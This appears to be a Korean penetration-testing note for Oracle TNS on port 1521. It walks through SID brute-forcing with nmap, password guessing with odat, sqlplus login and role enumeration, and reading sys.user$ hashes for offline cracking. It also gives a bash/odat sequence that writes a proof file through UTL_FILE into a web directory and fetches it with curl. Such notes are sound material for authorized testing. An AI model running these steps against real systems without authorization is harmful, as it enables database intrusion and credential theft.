---
tags:
  - 서비스/oracle
대표포트:
  - "T:1521"
서비스:
  - Oracle TNS
  - Oracle Database
---

# 1521_Oracle_TNS

## 발견 시 판단

현재 명령 실행 호스트에서 `<TARGET>:1521`의 Oracle Transparent Network Substrate(TNS) listener에 도달할 수 있고, 아직 유효한 System Identifier(SID)·service name·DB 계정은 확인하지 않은 상태에서 시작한다. 접속 식별자를 확정한 뒤 계정 인증, 일반 DB role, `sysdba`, hash 읽기, `UTL_FILE` 파일 쓰기를 서로 다른 권한 상태로 판단한다.

성공하면 로그인 계정이 읽을 수 있는 DB 객체와 role을 얻는다. `ORA-12505`·`ORA-12514`는 SID/service name과 listener 등록을, `ORA-01017`은 사용자·비밀번호와 인증 방식을, query·파일 작업 거부는 DB privilege와 directory object를 다시 확인한다. 파일 생성에는 `UTL_FILE` 실행 권한, writable Oracle directory object와 서버 파일 시스템 권한이 모두 필요하다.

## 서비스 고유 확인

| 우선순위 | 현재 가진 정보로 확인할 것 | 도구 | 확인 출력과 다음 판단 |
|---|---|---|---|
| 1 | SID | `nmap -p1521 -sV <TARGET> --script oracle-sid-brute` | 유효 SID 또는 service name 후보를 확인한다. |
| 2 | 계정 후보 | [[원격 비밀번호 공격]]에서 `odat passwordguesser -s <TARGET> -d <SID>` 실행 | 유효 계정을 확인하고 반복 인증 정책을 고려한다. |
| 3 | DB 로그인 | `sqlplus <USER>/<PASSWORD>@<TARGET>/<SID>` | SQL prompt 접근 여부를 확인한다. |
| 4 | DB role | `select * from user_role_privs;` | 일반 DB 사용자와 관리 role을 구분한다. |

### 선택적 UTL_FILE 텍스트 쓰기 proof

유효한 Oracle 계정, `UTL_FILE` 실행 권한, writable DIRECTORY object와 서버 파일 시스템 권한을 확인한 경우에만 고유한 텍스트 파일 하나를 만든다. 웹 루트가 확인된 경우에도 정적 내용 조회까지만 이 서비스 카드에서 판정한다.

```bash
PROOF="oracle-proof-$(date -u +%Y%m%dT%H%M%SZ)-$$.txt"
printf 'Oracle UTL_FILE proof: %s\n' "$PROOF" > "$PROOF"
odat utlfile -s <TARGET> -d <SID> -U <USER> -P <PASSWORD> --putFile <WRITABLE_DIRECTORY> "$PROOF" ./"$PROOF"
curl -fsS "http://<WEB_HOST>/$PROOF"
```

- ODAT 파일 생성 성공과 HTTP에서 고유 문자열 반환을 서로 다른 결과로 기록한다.
- HTTP `404`·`403`은 Oracle 파일 쓰기 실패가 아니라 웹 경로 불일치·접근 제어일 수 있다.
- 같은 DIRECTORY object를 사용할 수 있으면 `UTL_FILE.FREMOVE`로 정확한 파일 하나를 제거하고, 절대 경로 방식이면 서버 관리 경로에서 제거한다.

```sql
BEGIN
  UTL_FILE.FREMOVE('<DIRECTORY_OBJECT>', '<UNIQUE_FILE>');
END;
/
```

## 단서별 다음 경로

| 관찰 단서·현재 권한 | 지금 가능한 기법 | 도구 | 성공 결과 |
|---|---|---|---|
| SID 또는 service name 필요 | [[Oracle TNS SID 열거]] | `odat`, `nmap` | 로그인할 Oracle 인스턴스 식별자 |
| 기본 계정 또는 확보한 사용자 이름·비밀번호 후보 | [[원격 비밀번호 공격]] | `sqlplus`, `odat` | 계정 인증 성공 여부 |
| DB 로그인·role 확보 | [[DB 인증과 데이터 열거]] | `sqlplus`, `odat` | 접근 가능한 테이블·view·사용자 정보 |
| `sysdba`와 `sys.user$` 읽기 조건 | [[DB 인증과 데이터 열거]] | `sqlplus`, `odat` | offline cracking 대상 사용자 hash |
| `UTL_FILE` 실행 권한과 writable DIRECTORY object | 이 문서의 선택적 UTL_FILE 텍스트 쓰기 proof | `odat`, `curl` | writable directory의 파일 생성과 별도 웹 접근 여부 |

## 서비스 고유 주의 사항

- SID 또는 service name이 맞지 않으면 유효 credential도 접속에 실패할 수 있다.
- Oracle 버전별 기본 계정 정책이 다르며 일반 DB role과 `sysdba`를 구분한다.
- hash 읽기와 파일 쓰기는 각각 충분한 DB 권한이 필요하다.
- 파일 생성과 웹 실행은 별도 상태이며 웹 서버 경로까지 일치해야 한다.
